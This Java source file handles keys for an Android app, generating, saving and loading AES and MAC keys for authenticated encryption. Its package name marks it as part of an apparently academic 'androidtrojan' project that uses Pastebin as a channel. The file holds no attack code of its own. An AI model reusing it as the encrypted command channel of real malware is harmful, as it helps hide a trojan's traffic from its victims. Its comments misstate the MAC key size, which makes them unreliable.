/* Nethanel Gelernter (C) */

package il.ac.colman.androidtrojan.Channels.PasteBin.authenc;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.math.BigInteger;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.RSAPrivateKeySpec;
import java.security.spec.RSAPublicKeySpec;

import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import android.content.res.AssetManager;

public class AesMacKey implements AuthEncKey {
	public static final int encKeySize = 16; // bytes
	public static final int macKeySize = 32; // bytes
	public static final int keySize = encKeySize + macKeySize;  
	SecretKey encKey;
	SecretKey macKey;
	
	
	public AesMacKey() {
		//Generate AES key:
		KeyGenerator keyGen = null;
		try {
			keyGen = KeyGenerator.getInstance("AES");
		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		keyGen.init(encKeySize * 8);
		this.encKey = keyGen.generateKey();
		
		//Generate MAC key:
	    try {
			keyGen = KeyGenerator.getInstance(AesMacAuthEnc.MAC_ALG);
		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		this.macKey = keyGen.generateKey();
	}

	// receives byte array, when the first 16 bytes are for the encryption scheme, and the last ones (64) are for the MAC.
	public AesMacKey(byte[] key) {
		//System.arraycopy(key, 0, this.encKey.getEncoded(), 0, this.encKeySize);
		//System.arraycopy(key, this.encKeySize, this.macKey.getEncoded(), 0, this.macKeySize);
		this.encKey = new SecretKeySpec(key, 0, encKeySize, "AES");
		this.macKey = new SecretKeySpec(key, encKeySize, macKeySize, AesMacAuthEnc.MAC_ALG);
	}
			
	@Override
	public SecretKey getEncKey() {
		return this.encKey;
	}

	@Override
	public SecretKey getMacKey() {
		return this.macKey;	
	}
	
	@Override
	// return byte array, when the first 16 bytes are for the encryption scheme, and the last ones (64) are for the MAC.
	public byte[] getKey() {
		//System.out.println(this.macKey.getEncoded().length);
		//System.out.println(this.encKey.getEncoded().length);
		byte[] output = new byte[this.encKeySize + this.macKeySize];
		System.arraycopy(this.encKey.getEncoded(), 0, output, 0, this.encKeySize);
		System.arraycopy(this.macKey.getEncoded(), 0, output, this.encKeySize, this.macKeySize);
		return output;
	}
	
	
	public void saveToFile(String fileName) throws IOException {
		BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(fileName));
		try {
			bos.write(this.getKey());
		} catch (Exception e) {
			//throw new IOException("Unexpected error", e);
		} finally {
			bos.close();
		}
	}
	
	static public AesMacKey readKeyFromAsset(AssetManager asset, String keyFileFullPath) throws IOException {
		byte[] buffer = new byte[AesMacKey.keySize];
		InputStream in = asset.open(keyFileFullPath);
		BufferedInputStream bis = new BufferedInputStream(in);
		try {
		    bis.read(buffer);
		} catch (Exception e) {
		    throw new RuntimeException("Spurious serialisation error", e);
		} finally {
		    bis.close();
		}
		return new AesMacKey(buffer);
	}
	
}
